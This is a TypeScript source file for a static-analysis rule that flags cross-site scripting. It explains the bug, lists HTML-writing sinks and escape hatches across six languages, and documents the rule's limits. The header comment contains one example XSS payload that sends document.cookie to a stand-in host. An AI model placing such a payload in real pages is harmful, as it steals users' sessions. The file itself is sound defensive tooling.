/**
 * CROSS-SITE SCRIPTING - XSS  (CWE-79, OWASP A05:2025 - Injection)
 *
 * WHAT THE BUG IS, in plain language:
 * A browser reads HTML as instructions. `<script>` doesn't display the word
 * "script" - it runs code. So if your page inserts user-supplied text into HTML
 * without escaping it, the user can supply `<script>...</script>` and their code
 * runs inside YOUR page, with your user's session, cookies and permissions.
 *
 *     element.innerHTML = "Welcome " + userName;
 *
 * If `userName` is `<img src=x onerror=fetch('//evil/'+document.cookie)>`, the
 * browser dutifully loads a broken image, fires the error handler, and posts
 * the victim's session cookie to the attacker. The user never clicked anything.
 *
 * WHY IT'S CALLED "CROSS-SITE": the attacker's code runs on your site's origin,
 * so the browser trusts it exactly as much as it trusts you. Same-origin policy
 * - the rule that stops evil.com reading your bank tab - is on the attacker's
 * side now.
 *
 * THE FIX:
 *   - Use the text API, not the HTML API: `textContent` instead of `innerHTML`.
 *     `textContent` never parses tags; `<script>` becomes visible characters.
 *   - When you genuinely need HTML, escape it (< becomes &lt;) or run it through
 *     a sanitiser like DOMPurify that removes scripts and event handlers.
 *   - Template engines that auto-escape (React JSX, Jinja2, Go html/template)
 *     do this for you - which is exactly why the "escape hatches" in those
 *     libraries (dangerouslySetInnerHTML, |safe, template.HTML) are the places
 *     this rule watches.
 *
 * ESCAPING vs SANITISING (they are different, and people mix them up):
 * ESCAPING turns markup into visible text - safest, use it by default.
 * SANITISING keeps the markup but strips the dangerous parts - only when the
 * user is genuinely allowed to send HTML, and only with a real library.
 */

import type { Node } from 'web-tree-sitter';
import type { LanguageId } from '../parse/languages.js';
import { asAssignment, asCall, type Rule, type RuleHit } from './contract.js';
import { analyzeStringExpression, looksLikeHtml } from './lib/strings.js';
import { analyzeHtmlSafety, supportsHtmlSafety, type HtmlSafety } from './lib/html-safety.js';

/** Assigning to these properties parses the value as HTML. */
const HTML_SINK_PROPERTIES: Record<LanguageId, readonly string[]> = {
  // `__html` is the inner key of React's dangerouslySetInnerHTML={{ __html: x }},
  // which is where the actual value lands.
  javascript: ['innerHTML', 'outerHTML', 'dangerouslySetInnerHTML', '__html', 'srcdoc'],
  typescript: ['innerHTML', 'outerHTML', 'dangerouslySetInnerHTML', '__html', 'srcdoc'],
  python: [],
  java: [],
  go: [],
  // `echo` is not a property assignment - it is a PHP statement. The shape
  // layer captures `echo $x;` as an assignment whose TARGET is the `echo`
  // keyword itself, which lets the same rule cover it without inventing a
  // third shape kind. See ASSIGNMENT_QUERIES.php in engine/shapes.ts.
  php: ['echo', 'print'],
};

/** Calls that write raw HTML, or that switch a template engine's escaping OFF. */
const HTML_SINK_CALLS: Record<LanguageId, readonly string[]> = {
  javascript: ['write', 'writeln', 'insertAdjacentHTML', 'html', 'append', 'prepend', 'after', 'before'],
  typescript: ['write', 'writeln', 'insertAdjacentHTML', 'html', 'append', 'prepend', 'after', 'before'],
  python: ['mark_safe', 'Markup', 'HttpResponse', 'render_template_string', 'format_html'],
  java: ['print', 'println', 'write', 'printf', 'format', 'append'],
  go: ['HTML', 'HTMLAttr', 'JS', 'Write', 'Fprintf', 'Fprint', 'Fprintln'],
  php: ['printf', 'vprintf', 'print_r', 'var_dump'],
};

/**
 * Calls whose danger is unconditional because their whole purpose is to bypass
 * escaping. These are reported even when the argument is a plain variable,
 * because "trust me, this HTML is fine" is itself the risky decision.
 */
const ESCAPE_HATCHES = new Set([
  'mark_safe',
  'Markup',
  'render_template_string',
  'insertAdjacentHTML',
]);

/**
 * Run the safety proof where we have one, and return null where we do not.
 * A null means "this language is not covered by the proof", which the callers
 * must treat as "report", never as "safe".
 */
function judgeSafety(
  value: Node,
  ctx: { readonly file: { readonly root: Node } },
  language: LanguageId,
): HtmlSafety | null {
  if (!supportsHtmlSafety(language)) return null;
  return analyzeHtmlSafety(value, ctx.file.root, language);
}

/**
 * Turn the proof's result into a sentence a beginner can act on.
 *
 * The point is to name the SPECIFIC sub-expression that is still unescaped,
 * rather than gesturing at the whole statement. On a 40-line template literal
 * that is the difference between a usable finding and a shrug.
 */
function describeSafety(safety: HtmlSafety | null, dynamicParts: readonly string[]): string {
  if (!safety) {
    // No proof available for this language - fall back to naming what was spliced in.
    return dynamicParts.length
      ? `It splices in ${dynamicParts.slice(0, 3).map((p) => `\`${p}\``).join(', ')}, and no ` +
          `escaping is visible at this line. `
      : 'No escaping or sanitiser call is visible at this line. ';
  }

  const named = safety.unproven.slice(0, 3).map((p) => `\`${p}\``).join(', ');
  const escaped = safety.escapers.length
    ? `We did confirm ${safety.escapers.map((e) => `\`${e}\``).join(', ')} runs on the other ` +
      `spliced-in values, so this is not a blanket complaint about the line. `
    : '';

  if (safety.unproven.length === 0) {
    return `${escaped}No escaping is visible for the value that is spliced in. `;
  }

  return (
    `${escaped}What we could NOT prove safe: ${named}` +
    `${safety.unproven.length > 3 ? ` (and ${safety.unproven.length - 3} more)` : ''}. ` +
    `Each of those reaches the HTML parser exactly as written. `
  );
}

export const xssRule: Rule = {
  id: 'xss',
  name: 'Unescaped value written into HTML',
  cwe: 'CWE-79',
  owasp: 'A05:2025 Injection',
  severity: 'high',
  explanation:
    'A browser reads HTML as instructions, so text inserted into a page without ' +
    'escaping can bring its own <script> tag or event handler and run as your site. ' +
    'It then has your user\'s session and cookies. The fix is to use a text API ' +
    '(textContent) instead of an HTML API (innerHTML), or to escape/sanitise the ' +
    'value before it becomes markup.',
  limitations:
    'UNVERIFIED (signature-based): we confirmed a value reaches an HTML-writing sink ' +
    'and that at least one part of it could not be proven safe. We did NOT confirm ' +
    'that part is attacker-controlled. In JavaScript and TypeScript we resolve local ' +
    'variables and local render helpers and drop the finding when EVERY spliced-in ' +
    'value is a literal, a number, or the result of a known escaper - so a finding ' +
    'here names the parts that survived that check. Values escaped in another file, ' +
    'by an imported helper, or by a framework we do not model still read as unproven. ' +
    'DELIBERATE GAP: an escaper is trusted BY NAME (escapeHtml, DOMPurify.sanitize ' +
    'and similar). We do not verify that such a function actually escapes anything, ' +
    'with one exception - a local definition that returns its argument unchanged is ' +
    'rejected. A local `escapeHtml` that escapes only some characters would be ' +
    'believed. Python, Java and Go are not covered by that check at all and report ' +
    'on shape alone.',
  shapes: ['call', 'assignment'],
  support: {
    javascript: {
      status: 'implemented',
      note: 'Covers innerHTML/outerHTML/srcdoc assignment, document.write, insertAdjacentHTML, jQuery .html/.append, and React dangerouslySetInnerHTML.',
    },
    typescript: {
      status: 'implemented',
      note: 'Identical to JavaScript, including .tsx files via the tsx grammar.',
    },
    python: {
      status: 'partial',
      note: 'PARTIAL: Django/Flask escape hatches (mark_safe, Markup, render_template_string, HttpResponse with built HTML) are detected. Template files themselves (.html, .jinja) are NOT parsed at all, so `{{ x|safe }}` inside a template is invisible.',
    },
    java: {
      status: 'partial',
      note: 'PARTIAL: only servlet-style out.print/response.getWriter().write with built HTML. JSP files and Thymeleaf/Freemarker templates are not parsed.',
    },
    go: {
      status: 'partial',
      note: 'PARTIAL: template.HTML/template.JS conversions and w.Write/fmt.Fprintf with built HTML. Note that Go\'s html/template escapes automatically, so the template.HTML() conversion is the main real risk - which is exactly what we check.',
    },
    php: {
      status: 'partial',
      note: 'PARTIAL: `echo`/`print` of a built string, and printf/vprintf/print_r/var_dump. The escaper proof that covers JavaScript does NOT run here, so a value passed through htmlspecialchars in the same expression still reports on shape alone - the data-flow pass is what clears those. Blade and Twig templates are not parsed at all, so `{!! $x !!}` inside one is invisible.',
    },
  },
  check(shape, ctx): RuleHit | null {
    const language = ctx.language;

    /* ---- Assignment into an HTML-parsing property ---- */
    const assignment = asAssignment(shape);
    if (assignment) {
      if (!HTML_SINK_PROPERTIES[language].includes(assignment.targetName)) return null;
      const built = analyzeStringExpression(assignment.value, language);
      // A hard-coded HTML string is fine - nobody can inject into a constant.
      if (!built.isDynamic) return null;

      /* Before shouting, do the work: can every spliced-in value be proven
       * incapable of carrying markup? See lib/html-safety.ts for why this
       * exists - the short version is that the old text claimed no escaper was
       * visible on lines where the escaper was four characters away. */
      const safety = judgeSafety(assignment.value, ctx, language);
      if (safety?.proven) return null;

      return {
        node: assignment.node,
        message: `Value assigned to \`${assignment.targetName}\` is parsed as HTML`,
        reasoning:
          `Assigning to \`${assignment.targetName}\` makes the browser parse the value as ` +
          `HTML, so any tags or event handlers inside it run. The value here is not a ` +
          `fixed string - it was built via ${built.mechanism}. ` +
          describeSafety(safety, built.dynamicParts) +
          `\`textContent\` would render the same value harmlessly as text.`,
      };
    }

    /* ---- Call that writes HTML or disables escaping ---- */
    const call = asCall(shape);
    if (call) {
      if (!HTML_SINK_CALLS[language].includes(call.calleeName)) return null;

      const isEscapeHatch = ESCAPE_HATCHES.has(call.calleeName);

      for (const arg of call.args) {
        const built = analyzeStringExpression(arg, language);

        // `Markup("<html>")` with a fixed string is safe - there is nothing for
        // an attacker to put inside a constant. Measured against Flask's own
        // source, requiring a dynamic argument removed most of the noise from
        // this branch without losing a single real escape-hatch misuse.
        if (isEscapeHatch && !built.isDynamic) continue;

        if (isEscapeHatch) {
          return {
            node: call.node,
            message: `\`${call.calleeText}()\` marks a value as trusted HTML, disabling escaping`,
            reasoning:
              `\`${call.calleeText}()\` exists to tell the template engine "do not escape ` +
              `this - it is safe HTML". That promise is only true if the value contains no ` +
              `attacker-controlled text. Here the value is ` +
              `${built.isDynamic ? `built at runtime via ${built.mechanism}` : 'a runtime value'}, ` +
              `so the promise is being made about text nobody has checked.`,
          };
        }

        // For generic writers, require the text to actually look like markup -
        // otherwise every logger and every fmt.Fprintf in the repo lights up.
        if (!built.isDynamic) continue;
        if (!looksLikeHtml(built.literalText)) continue;

        const safety = judgeSafety(arg, ctx, language);
        if (safety?.proven) continue;

        return {
          node: arg,
          message: `HTML written by ${call.calleeText}() is built with ${built.mechanism}`,
          reasoning:
            `\`${call.calleeText}()\` writes its argument into the response or the document. ` +
            `The argument contains literal HTML ("${built.literalText.replace(/\s+/g, ' ').trim().slice(0, 60)}") ` +
            `and was assembled via ${built.mechanism}. ` +
            describeSafety(safety, built.dynamicParts) +
            `Markup inside an unescaped value reaches the browser as instructions.`,
        };
      }
    }

    return null;
  },
};
